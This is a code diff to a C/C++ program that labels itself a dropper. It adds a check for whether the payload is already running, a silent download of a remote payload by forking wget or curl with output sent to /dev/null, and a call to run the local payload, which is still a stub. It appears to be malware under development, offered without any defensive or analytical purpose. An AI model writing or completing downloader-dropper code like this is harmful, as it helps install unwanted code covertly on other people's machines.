@@ -5,19 +5,27 @@ int Pull()
 {
 	fprintf(stdout, "[Dropper called]");
 
-	bool payloadExists = FileExists(_PayloadLocal);
+	if(ProcessRunning())
+	{
+		fputs("[Process already running]\n", stdout);
+		return 0;
+	}
+	else
+	{
+		bool payloadExists = FileExists(_PayloadLocal);
+		
+		fputs(payloadExists ? "[Payload Exists]\n" : "[Doesn't Exist]\n", stdout);
 
-	//fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);
-
-	//if(!payloadExists)
-	//  	download();
-
-	//payloadRunning();
-	//
-	ProcessRunning();
-	//fputs(payloadRunning() ? "\nIs running" : "\nIsn't running", stdout);
-
-	//execute();
+		if(!payloadExists)
+		{
+			fputs("[Downloading...]\n", stdout);
+			Download();
+		}
+		else
+		{
+			Execute(_PayloadLocal);
+		}
+	}
 
 	return 0;
 }
@@ -56,10 +64,10 @@ bool ProcessRunning()
 	{
 		close(link[1]);
 		result = read(link[0], foo, sizeof(foo));
-		printf("\nPID: %.*s\n", result, foo);
+		printf("\n[PID] %.*s", result, foo);
 	}
 
-	return (result == 0);
+	return (result != 0);
 }
 
 
@@ -97,13 +105,15 @@ void Download()
 	{
 		if(FileExists(webclients[i]))
 		{
-				std::cout << "Found webclient: " << webclients[i] << std::endl;
+				//std::cout << "Found webclient: " << webclients[i] << std::endl;
 				
 				int pid = fork();
 
 				if(pid == 0)
 					execl(webclients[i], "wget", 
 										 (i == 0) ? "-q" : "-sS",
+										 (i == 0) ? "-o" : "",
+										 (i == 0) ? "/dev/null" : "",
 										 (i == 0) ? "-O" : "-o",
 										 _PayloadLocal.c_str(), 
 										 _PayloadRemote.c_str(),
@@ -114,7 +124,7 @@ void Download()
 	}
 }
 
-void Execute()
+void Execute(std::string binary)
 {
-
+	fputs("[End of control flow]\n", stdout);
 }
